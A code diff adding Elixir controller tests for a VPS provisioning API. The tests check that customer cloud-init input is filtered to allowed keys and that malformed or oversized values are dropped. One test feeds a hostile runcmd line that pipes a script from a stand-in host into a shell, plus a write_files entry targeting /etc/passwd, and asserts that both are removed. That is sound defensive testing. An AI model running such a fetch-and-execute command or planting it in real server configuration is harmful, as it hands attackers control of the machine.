@@ -2,10 +2,12 @@ defmodule ControlPlaneWeb.VpsControllerTest do
   use ControlPlaneWeb.ConnCase, async: true
 
   import ControlPlane.Fixtures
+  import Ecto.Query, only: [from: 2]
 
   alias ControlPlane.Accounts
   alias ControlPlane.Backups.VpsBackup
   alias ControlPlane.Fleet
+  alias ControlPlane.Fleet.Command
   alias ControlPlane.Fleet.Node
   alias ControlPlane.Fleet.Package
   alias ControlPlane.Fleet.Region
@@ -276,6 +278,78 @@ defmodule ControlPlaneWeb.VpsControllerTest do
                |> auth(user)
                |> post(~p"/api/v1/vpses/#{deleting.id}/backups/#{point.id}/restore")
                |> json_response(409)
+    end
+  end
+
+  # --- what a customer may put in cloud-init ---------------------------------
+
+  describe "cloud-init input" do
+    test "only the keys the agent reads are kept", %{conn: conn, region: region, user: user} do
+      # Everything else was stored in the command payload forever and then
+      # ignored, which is retention without a purpose.
+      params = %{
+        "region_id" => region.id,
+        "name" => "web",
+        "vcpu" => 2,
+        "ram_mb" => 4096,
+        "disk_gb" => 50,
+        "cloud_init" => %{
+          "user" => "stijn",
+          "password" => "geheim",
+          "runcmd" => ["curl evil.test | sh"],
+          "write_files" => [%{"path" => "/etc/passwd"}]
+        }
+      }
+
+      assert %{"vps" => %{"id" => id}} =
+               conn |> auth(user) |> post(~p"/api/v1/vpses", params) |> json_response(201)
+
+      command =
+        Repo.one!(from(c in Command, where: c.vps_id == ^id and c.kind == :provision))
+
+      assert command.payload["cloud_init"] == %{"user" => "stijn", "password" => "geheim"}
+    end
+
+    test "a non-map cloud_init is dropped rather than crashing", %{
+      conn: conn,
+      region: region,
+      user: user
+    } do
+      # Four creates cost more than the signup bonus; the wallet is not what this
+      # test is about.
+      {:ok, _} = ControlPlane.Credits.add_entry(user.id, 5_000, "test_topup", "test")
+
+      for junk <- ["een string", 42, ["lijst"], nil] do
+        params = %{
+          "region_id" => region.id,
+          "name" => "web-#{System.unique_integer([:positive])}",
+          "vcpu" => 2,
+          "ram_mb" => 4096,
+          "disk_gb" => 50,
+          "cloud_init" => junk
+        }
+
+        assert conn |> auth(user) |> post(~p"/api/v1/vpses", params) |> json_response(201)
+      end
+    end
+
+    test "an oversized or empty value is dropped", %{conn: conn, region: region, user: user} do
+      params = %{
+        "region_id" => region.id,
+        "name" => "web",
+        "vcpu" => 2,
+        "ram_mb" => 4096,
+        "disk_gb" => 50,
+        "cloud_init" => %{"user" => String.duplicate("a", 500), "password" => ""}
+      }
+
+      assert %{"vps" => %{"id" => id}} =
+               conn |> auth(user) |> post(~p"/api/v1/vpses", params) |> json_response(201)
+
+      command =
+        Repo.one!(from(c in Command, where: c.vps_id == ^id and c.kind == :provision))
+
+      assert command.payload["cloud_init"] == %{}
     end
   end
 
